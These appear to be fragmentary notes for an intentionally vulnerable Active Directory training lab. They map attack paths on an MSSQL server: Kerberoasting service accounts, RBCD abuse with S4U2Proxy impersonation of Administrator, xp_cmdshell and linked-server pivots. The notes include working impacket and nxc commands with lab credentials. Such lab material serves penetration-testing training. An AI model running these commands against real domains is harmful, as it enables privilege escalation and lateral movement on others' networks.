...
MSSQL server. RBCD set on SQL01$ (svc_web can act-on-behalf-of) and SQL Server is configured mixed-mode with `xp_cmdshell` available.
...
- `svc_sql` SPN: `MSSQLSvc/sql01.corp.local:1433` and `MSSQLSvc/sql01.corp.local` (no port) — Kerberoast both
...
`SQL01$ msDS-AllowedToActOnBehalfOfOtherIdentity` ← `svc_web` → S4U2Proxy as Administrator to `cifs/sql01` → SYSTEM.
...
nxc mssql $S -u alice -p 'DVADlab2024!' -q "SELECT system_user, is_srvrolemember('sysadmin')"
mssqlclient.py -windows-auth corp/alice:'DVADlab2024!'@$S
# inside:
SQL> enum_links
...
impacket-getST -spn cifs/sql01.corp.local -impersonate Administrator \
    -dc-ip 10.10.0.10 corp.local/svc_web:'<pwd>'
...
CRED-001 (Kerberoast svc_sql), CRED-017 (RBCD), PE-043/044 (StorSvc/CDPSvc), LAT-026 (MSSQL linked server pivot).
